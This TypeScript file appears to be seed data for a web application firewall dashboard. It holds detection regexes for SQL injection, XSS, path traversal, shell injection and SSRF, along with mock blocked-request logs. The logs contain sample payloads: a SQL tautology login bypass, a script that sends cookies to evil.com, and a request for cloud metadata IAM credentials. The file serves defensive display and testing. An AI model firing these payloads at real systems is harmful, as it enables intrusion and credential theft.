import {
  WafSecurityRule,
  WafLiveBlockedEvent,
  WafRateLimitPolicy,
  WafVirtualPatch,
  WafEngineOverview
} from '../types/waf';

export const INITIAL_WAF_RULES: WafSecurityRule[] = [
  {
    id: 'waf-rule-942100',
    ruleId: 942100,
    name: 'SQL Injection: Tautology / Boolean-Based Attack Filter',
    category: 'SQL_INJECTION',
    anomalyScore: 5,
    action: 'BLOCK_403',
    phase: 2,
    patternRegex: `(?i)(?:'|\")\\s*(?:or|and)\\s*['\"]?\\d+['\"]?\\s*=\\s*['\"]?\\d+`,
    enabled: true,
    totalHits: 84,
    owaspCrsReference: 'OWASP Core Rule Set (CRS) v3.3 - 942100'
  },
  {
    id: 'waf-rule-941100',
    ruleId: 941100,
    name: 'XSS: Cross-Site Scripting via <script> Tag or Event Handlers',
    category: 'CROSS_SITE_SCRIPTING',
    anomalyScore: 5,
    action: 'BLOCK_403',
    phase: 2,
    patternRegex: `(?i)<\\s*script[^>]*>|onload\\s*=|onerror\\s*=|javascript:`,
    enabled: true,
    totalHits: 41,
    owaspCrsReference: 'OWASP Core Rule Set (CRS) v3.3 - 941100'
  },
  {
    id: 'waf-rule-930100',
    ruleId: 930100,
    name: 'Path Traversal: Local File Inclusion & Directory Traversal Attempt',
    category: 'PATH_TRAVERSAL',
    anomalyScore: 5,
    action: 'BLOCK_403',
    phase: 1,
    patternRegex: `(?:\\.{2}[/\\\\]){2,}|(?:%2e%2e[/\\\\])`,
    enabled: true,
    totalHits: 29,
    owaspCrsReference: 'OWASP Core Rule Set (CRS) v3.3 - 930100'
  },
  {
    id: 'waf-rule-932100',
    ruleId: 932100,
    name: 'RCE: Shell Command Injection Meta-Characters',
    category: 'REMOTE_CODE_EXECUTION',
    anomalyScore: 5,
    action: 'BLOCK_403',
    phase: 2,
    patternRegex: `(?:;|\\||&&|\\$\\([^)]+\\)|` + '`' + `[^` + '`' + `]+` + '`' + `)\\s*(?:cat|ls|whoami|sh|bash|powershell)`,
    enabled: true,
    totalHits: 17,
    owaspCrsReference: 'OWASP Core Rule Set (CRS) v3.3 - 932100'
  },
  {
    id: 'waf-rule-934100',
    ruleId: 934100,
    name: 'SSRF: Server-Side Request Forgery against Cloud Metadata Services',
    category: 'SERVER_SIDE_REQUEST_FORGERY',
    anomalyScore: 5,
    action: 'BLOCK_403',
    phase: 2,
    patternRegex: `169\\.254\\.169\\.254|metadata\\.google\\.internal|127\\.0\\.0\\.1`,
    enabled: true,
    totalHits: 12,
    owaspCrsReference: 'OWASP Core Rule Set (CRS) v3.3 - 934100'
  }
];

export const INITIAL_WAF_EVENTS: WafLiveBlockedEvent[] = [
  {
    id: 'waf-evt-501',
    timestamp: 'Hoje, 08:44:11.231',
    clientIp: '198.51.100.89',
    clientGeo: '🇷🇺 São Petersburgo, RU',
    httpMethod: 'POST',
    uriPath: '/api/v1/auth/login',
    userAgent: 'sqlmap/1.7.2#stable (https://sqlmap.org)',
    attackType: 'SQL_INJECTION',
    triggeredRules: [
      {
        ruleId: 942100,
        ruleName: 'SQL Injection: Tautology Detection',
        matchedString: "' OR '1'='1' --",
        anomalyScore: 5
      },
      {
        ruleId: 913100,
        ruleName: 'Known Malicious Scanner User-Agent',
        matchedString: 'sqlmap/1.7.2',
        anomalyScore: 5
      }
    ],
    totalAnomalyScore: 10,
    actionEnforced: 'BLOCK_403',
    httpStatusReturned: 403,
    payloadSnippet: '{"username": "admin\' OR \'1\'=\'1\' --", "password": "fake"}',
    botScore: 99
  },
  {
    id: 'waf-evt-502',
    timestamp: 'Hoje, 08:38:40.090',
    clientIp: '203.0.113.112',
    clientGeo: '🇨🇳 Hangzhou, CN',
    httpMethod: 'GET',
    uriPath: '/search?query=<script>fetch("https://evil.com/leak?c="+document.cookie)</script>',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    attackType: 'CROSS_SITE_SCRIPTING',
    triggeredRules: [
      {
        ruleId: 941100,
        ruleName: 'XSS: Cross-Site Scripting via <script>',
        matchedString: '<script>fetch(',
        anomalyScore: 5
      }
    ],
    totalAnomalyScore: 5,
    actionEnforced: 'BLOCK_403',
    httpStatusReturned: 403,
    payloadSnippet: 'query=<script>fetch("https://evil.com/leak?c="+document.cookie)</script>',
    botScore: 82
  },
  {
    id: 'waf-evt-503',
    timestamp: 'Hoje, 08:29:15.541',
    clientIp: '185.220.101.99',
    clientGeo: '🇩🇪 Frankfurt, DE (Tor Exit Node)',
    httpMethod: 'POST',
    uriPath: '/api/v1/webhook/fetch-avatar',
    userAgent: 'python-requests/2.28.1',
    attackType: 'SERVER_SIDE_REQUEST_FORGERY',
    triggeredRules: [
      {
        ruleId: 934100,
        ruleName: 'SSRF: Cloud Metadata Access Attempt',
        matchedString: 'http://169.254.169.254/latest/meta-data/',
        anomalyScore: 5
      }
    ],
    totalAnomalyScore: 5,
    actionEnforced: 'BLOCK_403',
    httpStatusReturned: 403,
    payloadSnippet: '{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
    botScore: 95
  },
  {
    id: 'waf-evt-504',
    timestamp: 'Hoje, 08:14:02.120',
    clientIp: '45.142.212.18',
    clientGeo: '🇺🇸 Boydton, US (Data Center Proxy)',
    httpMethod: 'POST',
    uriPath: '/api/v1/auth/login',
    userAgent: 'Mozilla/5.0 (X11; Linux x86_64)',
    attackType: 'CREDENTIAL_STUFFING',
    triggeredRules: [
      {
        ruleId: 990100,
        ruleName: 'Rate Limit Policy Exceeded (Login Brute Force)',
        matchedString: '180 reqs/min em /api/v1/auth/login',
        anomalyScore: 4
      }
    ],
    totalAnomalyScore: 4,
    actionEnforced: 'CHALLENGE_CAPTCHA',
    httpStatusReturned: 429,
    payloadSnippet: '[Lote de 240 credenciais testadas em dicionário automático]',
    botScore: 92
  }
];

export const INITIAL_RATE_POLICIES: WafRateLimitPolicy[] = [
  {
    id: 'rl-01',
    name: 'Login & Autenticação Anti-Brute Force',
    targetEndpoint: '/api/v1/auth/login',
    rateLimitThreshold: 10,
    windowSeconds: 60,
    actionOnExceed: 'CHALLENGE_CAPTCHA',
    activeBansCount: 4,
    enabled: true
  },
  {
    id: 'rl-02',
    name: 'Anti-Scraping de Catálogo de Dados & APIs Públicas',
    targetEndpoint: '/api/v1/products/*',
    rateLimitThreshold: 120,
    windowSeconds: 60,
    actionOnExceed: 'BLOCK_429',
    activeBansCount: 1,
    enabled: true
  },
  {
    id: 'rl-03',
    name: 'Proteção de Checkout e Transações Financeiras',
    targetEndpoint: '/api/v1/checkout/process',
    rateLimitThreshold: 5,
    windowSeconds: 60,
    actionOnExceed: 'BLOCK_429',
    activeBansCount: 0,
    enabled: true
  }
];

export const INITIAL_VIRTUAL_PATCHES: WafVirtualPatch[] = [
  {
    cveId: 'CVE-2023-45853',
    targetSoftware: 'Node.js Express Body-Parser & Admin Endpoints',
    description: 'Bypass de validação de autenticação em endpoints administrativos através de injeção de parâmetros maliciosos.',
    mitigationRuleId: 942100,
    activeStatus: 'SHIELDED',
    patchDate: '15/09/2026'
  },
  {
    cveId: 'CVE-2021-44228',
    targetSoftware: 'Log4j / Log4Shell JNDI Lookup',
    description: 'Injeção de sequências JNDI no cabeçalho User-Agent ou parâmetros HTTP (${jndi:ldap://...}).',
    mitigationRuleId: 932100,
    activeStatus: 'SHIELDED',
    patchDate: '10/08/2026'
  },
  {
    cveId: 'CVE-2022-22965',
    targetSoftware: 'Spring4Shell DataBinder Parameter Binding',
    description: 'Manipulação de class.module.classLoader via payload HTTP POST multipart para sobrescrever rotas.',
    mitigationRuleId: 930100,
    activeStatus: 'SHIELDED',
    patchDate: '01/09/2026'
  }
];

export const INITIAL_WAF_OVERVIEW: WafEngineOverview = {
  mode: 'BLOCKING_ACTIVE',
  anomalyThreshold: 5,
  totalRequestsToday: 128450,
  blockedAttacksToday: 382,
  activeVirtualPatchesCount: 3,
  botMitigationRate: 98.6,
  avgInspectionLatencyMs: 0.94
};
